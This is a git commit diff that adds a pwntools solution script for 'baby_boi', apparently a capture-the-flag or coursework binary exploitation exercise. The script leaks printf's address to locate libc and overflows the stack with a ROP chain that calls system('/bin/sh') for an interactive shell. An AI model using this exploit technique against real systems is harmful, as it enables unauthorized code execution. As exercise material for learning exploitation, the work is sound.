87ae575bd0472c3ed17a92f489e84923d18453b9
Malachi Parks <Malachiparks1999@gmail.com>
2022-03-15 14:20:07 -0400

    Finished PCP13

--- PCPs/Pacecar13/baby_boi_answer.py
+++ PCPs/Pacecar13/baby_boi_answer.py
@@ -32,5 +32,39 @@ DYNAMIC SYMBOL TABLE:
 0000000000000000      DF *UND*  0000000000000000 (GLIBC_2.2.5) printf
 0000000000601060 g    DO .bss   0000000000000008 (GLIBC_2.2.5) stderr
 
+Library offsets according to blukat alt
+https://libc.nullbyte.cat/?q=printf%3A9b0
 '''
+
+# Import libraries
+from pwn import *
+
+
+# Set up ELF
+elf = ELF("./baby_boi")
+
+# Set up varibles
+printfOffset='0x0509b0'      # Offset from libc in hex
+printOffsetint=int(printfOffset, 16)
+padding=b'a'*40  # Padding to get to rip via overflow    32 stack, 8 byte rbp
+poprdi=p64(0x400793)    # Pop shell for system call to use
+retgad=p64(0x40054e)       # stack align
+
+# Set up process and set up leak
+p=process("./baby_boi")
+resp=p.recvuntil(b": ")  # Recieve up to start of the leak
+leak=p.recvuntil(b"\n")  # Leak from printf
+leakint=int(leak,16)     # L3ak to int
+
+# Find start of libc
+libc = elf.libc         # Save local copy of binary libc
+libcStart = leakint - libc.sym.printf #printOffsetint       # Find start of libc
+libc.address = libcStart        # Start with base, call anything else
+
+# Craft payload
+binsh = p64(next(libc.search(b'/bin/sh\x00')))
+libsys = p64(libc.sym.system)
+payload = padding + poprdi + binsh + retgad + libsys
+p.sendline(payload)
+p.interactive()
 
